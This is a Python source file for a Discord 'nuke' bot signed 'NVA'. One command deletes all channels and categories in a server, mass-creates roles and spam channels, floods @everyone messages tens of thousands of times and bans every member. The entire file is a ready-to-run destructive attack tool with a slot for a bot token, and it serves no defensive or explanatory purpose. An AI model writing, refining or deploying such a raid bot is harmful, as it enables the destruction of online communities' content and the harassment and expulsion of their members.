import discord
from discord.ext import commands
import asyncio
import threading
import time
import random
import string
import ctypes

bot = commands.Bot(command_prefix='.', intents=discord.Intents.all())

@bot.event
async def on_ready():
    print(f'wassam, I have logged in as {bot.user}')

@bot.command()
async def nuke(ctx):
    server = ctx.guild

    def delete_channels():
        for channel in server.channels:
            try:
                asyncio.run_coroutine_threadsafe(channel.delete(reason="Erased by NVA"), bot.loop).result()
            except:
                pass

    def delete_categories():
        for category in server.categories:
            try:
                asyncio.run_coroutine_threadsafe(category.delete(reason="Erased by NVA"), bot.loop).result()
            except:
                pass

    def create_roles():
        for _ in range(100):
            asyncio.run_coroutine_threadsafe(server.create_role(name="NVA", reason="Infused by the Power of NVA"), bot.loop).result()

    def assign_roles():
        for _ in range(200):
            for member in server.members:
                try:
                    role = discord.utils.get(server.roles, name="NVA")
                    asyncio.run_coroutine_threadsafe(member.add_roles(role), bot.loop).result()
                except:
                    pass

    def create_spam_channels():
        for _ in range(20):
            spam_category = asyncio.run_coroutine_threadsafe(server.create_category("Nuked by NVA"), bot.loop).result()
            for _ in range(100):
                spam_channel = asyncio.run_coroutine_threadsafe(server.create_text_channel("nva-spam", category=spam_category), bot.loop).result()
                for _ in range(30):
                    asyncio.run_coroutine_threadsafe(spam_channel.send("@everyone Server has been erased by NVA! Prepare for annihilation!"), bot.loop).result()
                asyncio.run_coroutine_threadsafe(spam_channel.send("🤡 @everyone @here Clown shit incoming! 🤡"), bot.loop).result()

    def send_obliteration_messages():
        for _ in range(20000):
            asyncio.run_coroutine_threadsafe(ctx.send("@everyone Server has been obliterated! Prepare for the end!"), bot.loop).result()

    def ban_members():
        for member in server.members:
            try:
                asyncio.run_coroutine_threadsafe(member.ban(reason="Nuked by NVA"), bot.loop).result()
            except:
                pass

    threads = [
        threading.Thread(target=delete_channels),
        threading.Thread(target=delete_categories),
        threading.Thread(target=create_roles),
        threading.Thread(target=assign_roles),
        threading.Thread(target=create_spam_channels),
        threading.Thread(target=send_obliteration_messages),
        threading.Thread(target=ban_members)
    ]
  
    for thread in threads:
        thread.start()
        
    for thread in threads:
        thread.join()

    
    ctypes.windll.kernel32.SetConsoleTitleW("NVA has conquered all!")
    while True:
        time.sleep(1)
        random_title = ''.join(random.choices(string.ascii_uppercase + string.ascii_lowercase, k=10))
        ctypes.windll.kernel32.SetConsoleTitleW(random_title)

bot.run("insert your bot token here")
